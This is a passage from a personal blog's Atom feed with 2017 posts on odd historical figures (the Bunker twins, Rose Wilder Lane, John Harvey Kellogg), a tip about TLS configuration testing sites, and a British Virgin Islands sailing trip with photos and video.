<iframe class="fill-width" width="560" height="315" src="https://www.youtube.com/embed/shNvpsrlaF0" frameborder="0" allowfullscreen></iframe>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Four Fascinating and Weird People]]></title>
    <link href="https://www.davidxia.com/2017/06/four-fascinating-and-weird-people/"/>
    <updated>2017-06-01T06:36:06-04:00</updated>
    <id>https://www.davidxia.com/2017/06/four-fascinating-and-weird-people</id>
    <content type="html"><![CDATA[<p>Here are the stories of four fascinating and weird people that will make you laugh, be inspired,
or cringe. Chang and Eng Bunker were conjoined twins who married two sisters and were slave-owners
on the side of the Southern Confederacy. Rose Wilder Lane is the daughter of the author who wrote
the <em>Little House</em> childrens books, a founding member of the American Libertarian movement, and just
all around boss ass bitch. John Harvey Kellogg was the inventor of corn flakes, doctor, zealous
anti-masturbation campaigner, and eugenicist.</p>

<!-- more -->


<h2>1. Chang and Eng Bunker</h2>

<p><a href="https://en.wikipedia.org/wiki/Chang_and_Eng_Bunker">Chang and Eng</a> were two conjoined twins born
in Vietnam in the 1800s. The term &ldquo;Siamese twins&rdquo; is based on them.</p>

<blockquote><p>The brothers were joined at the sternum by a small piece of cartilage, and though their livers
  were fused, they were independently complete.</p></blockquote>

<p>After a Scotsman noticed them and paraded them around as a freak show attraction for ten
years, the Bunker twins settled down in Wilkesboro, North Carolina. They married two local white
women who were sisters. They became naturalized American citizens and even owned slaves.</p>

<p>The Bunkers and their wives slept in a bed built for four. After a while their wives started to not
get along. So they alternated between two different houses. Chang had twelve children while
Eng had ten. Today their descendents number more than 1,500 and hold reunions. Their liver is on
display in at the Mütter Museum in Philadelphia, Pennsylvania.</p>

<h2>2. Rose Wilder Lane</h2>

<p><a href="https://en.wikipedia.org/wiki/Rose_Wilder_Lane">Rose Wilder Lane</a> was the eldest child of Laura
Ingalls Wilder, the ostensible author of the <a href="https://en.wikipedia.org/wiki/List_of_Little_House_on_the_Prairie_books">Little House book series</a>.
Lane was by all means a boss ass bitch who lived a full life.</p>

<p>Sick of crop failures and tough frontier life, Lane moved in 1908 to San Francisco, California.
She married a salesman named Gillette Lane and became pregnant. Sadly, her son was stillborn, and
a subsequent surgery left her unable to have kids.</p>

<blockquote><p>She felt her intellectual interests did not mesh with the life she was living with her husband.
Keenly aware of her lack of a formal education, during these years, Lane read voraciously and
taught herself several languages. Her writing career began around 1908, with occasional
freelance newspaper jobs that earned much-needed extra cash.</p><footer><strong>Early career, marriage and divorce</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Early_career.2C_marriage_and_divorce'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>Lane&rsquo;s writing career took off. She wrote for publications like <em>Harper&rsquo;s</em> and <em>Saturday Evening
Post</em>.</p>

<blockquote><p>In the late 1920s, Lane was reputed to be one of the highest-paid female writers in America, and
along with Hoover, she counted among her friends well known figures such as Sinclair Lewis,
Isabel Paterson, Dorothy Thompson, John Patric, and Lowell Thomas.</p><footer><strong>Freelance writing career</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Freelance_writing_career'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>When Lane&rsquo;s mother approached her with a rough autobiographical manuscript of her own childhood,
Lane sensed that an American public fatigued by the Great Depression would take to the story of
the loving, persistent, and independent Ingalls family. Lane encouraged and helped her mother
rewrite and sell the story as a children&rsquo;s novel. The book became a big success, and an entire
series replete with T.V. shows, merchandise, and museums followed. Their family was raking
in the dough.</p>

<p>I read the entire series as a kid and stil wax nostalgic for it. I thought Lane&rsquo;s mother, who&rsquo;s the
titled author, wrote every book on her own and only received encouragement from her Lane. It turns
out, however, that the truth is more interesting.</p>

<blockquote><p>&#8230;an ongoing mutual collaboration that involved Lane more extensively in the
earlier books, and to a much lesser extent by the time the series ended, as Wilder&#8217;s confidence
in her own writing ability increased. Lane insisted to the end that her role was little more than
that of her mother&#8217;s adviser, despite documentation to the contrary&#8230;Literary historians
believe that Lane&#8217;s editing skills brought the dramatic pacing, literary structure, and
characterization critically needed to make the stories publishable in book form.</p><footer><strong>Literary collaboration</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Literary_collaboration'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>Even more fascinating is Lane&rsquo;s societal and political views. She was a libertarian, economically
laissez faire, anti-racist, and anti-communist. She protested paying income taxes, opposed the New
Deal, and thought Social Security was a Ponzi scheme that would destroy the United States.</p>

<blockquote><p>Lane played a hands-on role during the 1940s and 1950s in launching the &#8220;libertarian movement&#8221;
and began an extensive correspondence with figures such as DuPont executive Jasper Crane and
writer Frank Meyer, as well as her friend and colleague, Ayn Rand. She wrote book reviews
for the National Economic Council and later for the Volker Fund, out of which grew the Institute
for Humane Studies. Later, she lectured at, and gave generous financial support to, the Freedom
School headed by libertarian Robert LeFevre.</p><footer><strong>Later years and death</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Later_years_and_death'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<p>I want to reread the <em>Little House</em> books now knowing she was a die-hard libertarian who along with
her mother purposefully wove themes of individualism into the series.</p>

<blockquote><p>Rose Wilder Lane died in her sleep at age 81, on October 30, 1968, just as she was about to
depart on a three-year world tour. She was buried next to her parents at Mansfield Cemetery in
Mansfield, Missouri.</p><footer><strong>Later years and death</strong> <cite><a href='https://en.wikipedia.org/wiki/Rose_Wilder_Lane#Later_years_and_death'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<h2>3. John Harvey Kellogg</h2>

<p>I haven&rsquo;t read the entire Wikipedia entry on <a href="https://en.wikipedia.org/wiki/John_Harvey_Kellogg">John Harvey Kellogg</a> yet since
a colleague only recently drew my attention to this smart, prolific, and bizarre man. These parts
stood out to me at first glance though.</p>

<ul>
<li>he invented corn flakes with his brother, Will Keith Kellogg</li>
<li>he was a medical doctor &ldquo;who ran a sanitarium using holistic methods, with a particular focus on
nutrition, enemas, and exercise. Kellogg was an advocate of vegetarianism&rdquo;</li>
<li>he also created various phototherapeutic and electrotherapeutic inventions</li>
<li>he advocated sexual abstinence and &ldquo;advocated keeping the diet plain to prevent sexual arousal&rdquo;</li>
<li>he was an &ldquo;especially zealous campaigner against masturbation&rdquo;</li>
</ul>


<blockquote><p>He also recommended, to prevent children from this &#8220;solitary vice&#8221;, bandaging or tying their hands,
covering their genitals with patented cages and electrical shock.</p><footer><strong>Masturbation prevention</strong> <cite><a href='https://en.wikipedia.org/wiki/John_Harvey_Kellogg#Masturbation_prevention'>en.wikipedia.org/wiki/&hellip;</a></cite></footer></blockquote>


<ul>
<li>he liked yogurt enemas</li>
<li>he was a eugenicist</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Useful Site for TLS Server Test]]></title>
    <link href="https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration/"/>
    <updated>2017-05-20T12:49:20-04:00</updated>
    <id>https://www.davidxia.com/2017/05/useful-site-for-testing-tls-server-configuration</id>
    <content type="html"><![CDATA[<p>My home server&rsquo;s hard disk&rsquo;s partition map was somehow corrupted. So I&rsquo;m serving this website
from <a href="https://m.do.co/c/74c553045962">Digital Ocean</a> for now instead of my apartment. While rewriting the nginx server configs,
I found this useful site that <a href="https://www.ssllabs.com/ssltest/index.html">tests your server&rsquo;s TLS configuration</a>. It&rsquo;ll give you a grade
and warn you of weak encryption, key exchange protocols, cipher suites, etc.</p>

<p><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/">Mozilla&rsquo;s TLS configuration generator</a> is useful for providing secure defaults.</p>

<p>I&rsquo;m proud to say this site has an A.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[British Virgin Islands Sailing Trip Video]]></title>
    <link href="https://www.davidxia.com/2017/05/british-virgin-islands-sailing-trip-video/"/>
    <updated>2017-05-20T11:51:50-04:00</updated>
    <id>https://www.davidxia.com/2017/05/british-virgin-islands-sailing-trip-video</id>
    <content type="html"><![CDATA[<p>I finally got around to editing the footage from the sailing trip.</p>

<iframe class="fill-width" width="560" height="315" src="https://www.youtube.com/embed/7ZaCY7rHLgg" frameborder="0" allowfullscreen></iframe>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[British Virgin Islands Sailing Trip]]></title>
    <link href="https://www.davidxia.com/2017/03/british-virgin-islands-sailing-trip/"/>
    <updated>2017-03-03T21:10:36-05:00</updated>
    <id>https://www.davidxia.com/2017/03/british-virgin-islands-sailing-trip</id>
    <content type="html"><![CDATA[<p>I learned the basics of sailing on a week-long sailing trip in the British Virgin Islands aboard
a 48-foot catamaran we called Millenium Falcon.</p>

<h3>January 30</h3>

<p>We moored off the coast of Virgin Gorda and Saba Rock. President Obama was wind surfing at neighboring Necker Island as a guest of Richard Branson.</p>

<p><img class="center" src="https://i.imgur.com/xtJYYezh.jpg"></p>

<div class='image center'><img  src="https://i.imgur.com/WY4BnbMh.jpg" title="The dinghy race at Virgin Gorda." ><div class='caption'>The dinghy race at Virgin Gorda.</div></div>




<!-- more -->


<h3>January 31</h3>

<p>Anegada</p>

<p><img class="center" src="https://i.imgur.com/eZ8wlJjh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/8BhieRQh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/Z9eqNS4h.jpg"></p>

<p><img class="center" src="https://i.imgur.com/vGEIw30h.jpg"></p>

<h3>Last day - February 4</h3>

<p>Sailing through Tatch Island Cut during the race. We stopped racing because the wind died
and we needed to return the charter boat on time.</p>

<p><img class="center" src="https://i.imgur.com/rOfYB1Uh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/qofwLFhh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/3VJRFjHh.jpg"></p>

<p><img class="center" src="https://i.imgur.com/rfuiRe4h.jpg"></p>

<div class='image center'><img  src="https://i.imgur.com/IOXPlZxh.jpg" title="Boat mate and colleague Bastian." ><div class='caption'>Boat mate and colleague Bastian.</div></div>




<div class='image center'><img  src="https://i.imgur.com/VcsIgQAh.jpg" title="The rest of my boat's crew." ><div class='caption'>The rest of my boat&#8217;s crew.</div></div>




<div class='image center'><img  src="https://i.imgur.com/62Prw81h.jpg" title="We saw lots of nice houses built on cliffs." ><div class='caption'>We saw lots of nice houses built on cliffs.</div></div>

]]></content>
  </entry>
  
</feed>
